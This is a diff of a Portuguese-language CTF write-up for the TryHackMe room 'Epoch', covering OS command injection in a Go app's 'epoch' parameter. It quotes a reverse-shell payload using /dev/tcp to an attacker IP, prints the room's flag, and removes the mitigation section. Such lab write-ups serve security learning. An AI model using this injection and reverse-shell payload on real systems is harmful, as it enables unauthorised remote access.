@@ -42,7 +42,7 @@ views
 
 Os arquivos `go.mod`, `go.sum`, `main` e `main.go` revelam que o backend é uma aplicação escrita em **Go**, que provavelmente executa algo equivalente a `date -d @<input>` via `os/exec` repassando o parâmetro do usuário sem escapá-lo — uma clássica falha de **OS Command Injection**.
 
-![Detecção da vulnerabilidade de Command Injection](images/01-command-injection-detected.png)
+![Detecção da vulnerabilidade de Command Injection](images/Detect_Vuln.png)
 *Figura 1 — Injeção de `& ls` no parâmetro `epoch` executando um comando arbitrário no servidor*
 
 ---
@@ -71,7 +71,7 @@ $ id
 uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
 ```
 
-![Reverse shell obtida via Command Injection](images/02-reverse-shell-payload.png)
+![Reverse shell obtida via Command Injection](images/Reverse_Shell.png)
 *Figura 2 — Payload de reverse shell injetado no parâmetro `epoch` e conexão recebida no listener Netcat*
 
 ---
@@ -100,7 +100,7 @@ FLAG=flag{7da6c7debd40bd611560c13d8149b647}
 
 A flag estava armazenada diretamente como uma variável de ambiente (`FLAG`) dentro do container, uma prática comum em desafios containerizados (o `HOSTNAME=e7c1352e71ec` confirma que o alvo roda em um container Docker).
 
-![Flag capturada via variáveis de ambiente](images/03-flag-captured.png)
+![Flag capturada via variáveis de ambiente](images/Flag.png)
 *Figura 3 — Flag obtida através do comando `printenv` dentro da reverse shell*
 
 ---
@@ -123,18 +123,10 @@ flag{7da6c7debd40bd611560c13d8149b647}
 | 4 | Injeção de payload `sh -i >& /dev/tcp/<attacker_ip>/4444 0&1` para obter reverse shell |
 | 5 | Enumeração do sistema (`id`, `find`) e captura da flag via `printenv` |
 
+---
+
 ## Causa Raiz
 
 A aplicação Go concatena/repassa o valor do parâmetro `epoch` diretamente para um comando de shell (equivalente a `sh -c "date -d @<input>"`), sem validação de formato nem uso de APIs seguras de execução (como `exec.Command` com argumentos separados, sem invocar um shell intermediário). Isso permite que o atacante injete metacaracteres de shell (`&`, `;`, `|`, `` ` ``, `$()`) para executar comandos arbitrários no contexto do processo do servidor.
 
-## Recomendações de Mitigação
-
-- Nunca repassar entrada do usuário diretamente para um shell (`sh -c`, `os.system`, etc.).
-- Validar rigorosamente o formato esperado do input (ex.: regex restrita a dígitos para um timestamp UNIX) antes de qualquer processamento.
-- Utilizar bibliotecas nativas da linguagem para conversão de data/hora (ex.: pacote `time` do Go) em vez de invocar o binário `date` via shell.
-- Caso a execução de comandos externos seja inevitável, usar `exec.Command(bin, arg1, arg2, ...)` sem shell intermediário, o que impede a interpretação de metacaracteres como `&` e `;`.
-- Executar a aplicação com o menor privilégio possível e não armazenar segredos (como flags/credenciais) em variáveis de ambiente acessíveis ao processo da aplicação.
-
 ---
-
-*Writeup por Mauricio Robert — TryHackMe Room: [Epoch](https://tryhackme.com/room/epoch)*
